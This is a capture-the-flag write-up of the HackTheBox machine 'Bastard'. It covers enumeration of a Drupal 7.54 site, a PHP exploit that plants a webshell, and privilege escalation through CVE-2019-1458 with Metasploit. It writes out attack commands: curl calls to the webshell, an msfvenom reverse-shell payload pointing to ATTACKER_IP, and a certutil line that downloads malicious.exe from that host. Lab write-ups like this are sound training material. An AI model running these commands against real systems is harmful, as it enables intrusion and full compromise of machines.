## Welcome everyone!




Today, we will explore *Bastard*, a medium-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Bastard/Bastard_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP   bastard.htb`  to your local `/etc/hosts` file to enable DNS resolution) 





## Information Gathering


First, we will perform an aggressive Nmap scan to gather as much information as possible about the target system:

![image](/HTB/Bastard/Bastard_images/2.png)

There are three exposed services:

**HTTP** (Microsoft IIS 7.5 | 80)

**RPC** (Microsoft Windows RPC | 135/49154)

Inspecting the website hosted on port **80** reveals a **Drupal** web application:

![image](/HTB/Bastard/Bastard_images/3.png)

Since we don’t have valid credentials and there are no default credentials for this CMS, we cannot log in.

Checking the `changelog.txt` file reveals the web application version which is **7.54**:

![image](/HTB/Bastard/Bastard_images/4.png)

We can search for potential exploits affecting this Drupal version using `searchsploit`:

![image](/HTB/Bastard/Bastard_images/5.png)





## Initial Access


Inspecting the **PHP exploit script** highlighted above, we can observe that it matches the version of the Drupal CMS we’re targeting:

![image](/HTB/Bastard/Bastard_images/6.png)

This script allows us to achieve **remote code execution** (RCE) by uploading a **webshell**.

It appears that we need to configure the script according to the target system to make it functional. We need to specify the target IP through the `$url` variable, but that is not all. The REST API endpoint must be specified through the `$endpoint_path` variable. After trying several endpoints, we can identify a valid `/rest` endpoint accessible on the target system:

![image](/HTB/Bastard/Bastard_images/7.png)

We can provide the target IP and the **REST API** endpoint to our PHP script in order to upload the webshell to the target system:

![image](/HTB/Bastard/Bastard_images/8.png)

![image](/HTB/Bastard/Bastard_images/9.png)

The webshell has successfully been created. Since the target system is running Windows and hosts a Microsoft IIS server, we can attempt to use the webshell with the following `curl` command:

`curl -X POST http://10.129.27.161/dixuSOspsOUU.php -d 'system("COMMAND");'`

![image](/HTB/Bastard/Bastard_images/10.png)

It works! We can now execute arbitrary operating system commands through the uploaded webshell. We can leverage this to obtain initial access on the machine by generating an **MSFVenom** payload that we will transfer to the target and execute. We first need to identify the target architecture to adapt our payload. This can be identified using the `systeminfo` system command:

![image](/HTB/Bastard/Bastard_images/11.png)

We can confirm that the target architecture is **x64-based**. Hence, we can create a reverse TCP Meterpreter staged payload with the following `msfvenom` command:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe`

Once generated, we will transfer it to the target by setting up a **Python server** in the same directory listening on port 8000 that will serve our malicious payload. The file can be downloaded onto the target with the following `certutil` system command:

`certutil -urlcache -f http://ATTACKER_IP:8000/malicious.exe malicious.exe`

![image](/HTB/Bastard/Bastard_images/12.png)

Once the file has been transferred, we need to set up a `multi/handler` listener to catch the reverse shell.

I will provide the same configuration as I did for the msfvenom payload:

![image](/HTB/Bastard/Bastard_images/13.png)

We can now execute the malicious file from the target system with `.\malicious.exe` to gain access on the machine:

![image](/HTB/Bastard/Bastard_images/14.png)

The HTTP request made by the `curl` command should hang, as shown above, resulting in a reverse shell successfully initiated, granting a Meterpreter session running in the context of the **NT AUTHORITY\IUSR** account. The `shell` built-in command allows us to access the `cmd.exe` terminal and navigate to the filesystem:

![image](/HTB/Bastard/Bastard_images/15.png)

Inspecting the `C:\Users` directory, we can identify a `dimitris` folder that we can access, which contains the user flag in the `Desktop` directory:

![image](/HTB/Bastard/Bastard_images/16.png)





## Privilege Escalation


We now need to escalate our privilege to **NT AUTHORITY \SYSTEM** in order to retrieve the final flag. One of the first things we want to check at this step is which privileges are assigned to the compromised user. This can be verified by running `whoami /priv`:

![image](/HTB/Bastard/Bastard_images/17.png)

We can identify two very interesting privileges: SeImpersonatePrivilege and SeCreateGlobalPrivilege. These privileges can be abused to impersonate another user’s token to obtain elevated access. Since we obtained a Meterpreter session, we can use the `local_exploit_suggester` post-exploitation module to identify local privilege escalation paths. Getting back to our Meterpreter shell using CTRL+Z and selecting the `local_exploit_suggester` module, we only need to configure the `SESSION` value, representing the Meterpreter session we obtained:


![image](/HTB/Bastard/Bastard_images/18.png)


We can identify multiple exploit modules that could escalate our current privileges. After inspecting them, we can identify a working `windows/local/cve_2019_1458_wizardopium` exploit module. After configuring the required options, we can run the exploit:

![image](/HTB/Bastard/Bastard_images/19.png)

We successfully escalated our privilege to **NT AUTHORITY\SYSTEM**, granting full access and control on the target machine! This can be verified by running the `getprivs` Meterpreter command to list our current privileges (all):

![image](/HTB/Bastard/Bastard_images/20.png)

 We can now access the protected `C:\Users\Administrator\Desktop` directory to retrieve the root flag:

![image](/HTB/Bastard/Bastard_images/21.png)

Machine completed!

![image](/HTB/Bastard/Bastard_images/22.png)





## Conclusion


This room was interesting. Starting from a basic web enumeration, we discovered a Drupal application used by the web server. We could identify its version by checking the exposed `changelog.txt` file from our web browser. This allowed us to identify a vulnerability affecting this version that allows an attacker to inject malicious code to create a webshell allowing arbitrary command execution. We leveraged this vulnerability to obtain our initial foothold by using an `msfvenom` payload, granting us a Meterpreter session. During the privilege escalation phase, we abused the power of **Metasploit** by using a post exploitation module which acted as a privilege escalation vector scanner, making it more straightforward than **WinPEAS** in some situations. This allowed us to exploit the **CVE-2019-1458** vulnerability, which led to full access and control over the target machine.
Please note that I simply wanted to highlight the power of Metasploit in this challenge. However, do not become **dependent** on it. Blindly testing every exploit you find against a real target can be dangerous and may lead to a Denial of Service (DoS) or even data loss. Since this was a controlled Hack The Box environment, I allowed myself to take this approach.


**Thank you for reading!**




PS: You might be thinking, “What a **bastard**—he's using Metasploit throughout the entire privilege escalation phase!” But just for the heck of it, I had to do it.
